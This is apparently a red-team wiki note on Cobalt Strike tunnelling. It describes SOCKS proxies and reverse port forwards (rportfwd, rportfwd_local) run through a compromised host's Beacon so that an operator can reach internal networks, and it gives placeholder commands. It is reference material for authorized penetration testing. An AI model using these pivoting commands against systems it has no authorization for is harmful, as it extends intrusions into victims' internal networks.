# Cobalt Strike Tunneling

> Cobalt Strike's capabilities for leveraging external tooling through exisitng accesses to achieve objectives.

---

## SOCKS4 Proxy

With a Beacon on a target, you can create a [[socks]] proxy from **a port on the Team Server** through **the target's beacon** to **any endpoint accessible from the target**.

The primary purpose of this is to leverage external tooling to interact with targets (Linux tools via [[proxychains]], Windows tools via [Proxifier](https://www.proxifier.com/), FireFox via FoxyProxy, Metasploit via `setg Proxies`, etc.).

Note that this [[socks]] proxy port on the Team Server will be listening on all interfaces, likely publicly accessible. Leverage firewall rules to ensure only authorized operators can access it.

```beacon
socks $BIND_PORT
```

To stop the [[socks]] proxy server:

```beacon
socks stop $BIND_PORT
```

---

## Port Forward through Team Server (`rportfwd`)

With a Beacon on a target, you can create a port forward from **an endpoint on that target** through **the Team Server** to **any endpoint accessible from the Team Server**.

The primary purpose of this is to allow compromised targets that can't reach the Internet to interact directly with an external asset or tool.

```beacon
rportfwd $BINDPORT $FORWARD_ADDRESS $FORWARD_PORT
```

To stop the port foward:

```beacon
rportfwd stop $BINDPORT
```

---

## Port Forward through Cobalt Strike Client (`rportfwd_local`)

With a Beacon on a target, you can create a port forward from **an endpoint on that target** through **the Cobalt Strike client currently interacting with the Beacon** to **any endpoint accessible from the Cobalt Strike client**.

The primary purpose of this is to allow compromised targets to interact directly with external tooling on the operator's client machine.

```beacon
rportfwd_local $BINDPORT $FORWARD_ADDRESS $FORWARD_PORT
```

To stop the port forward:

```beacon
rportfwd_local stop $BINDPORT
```
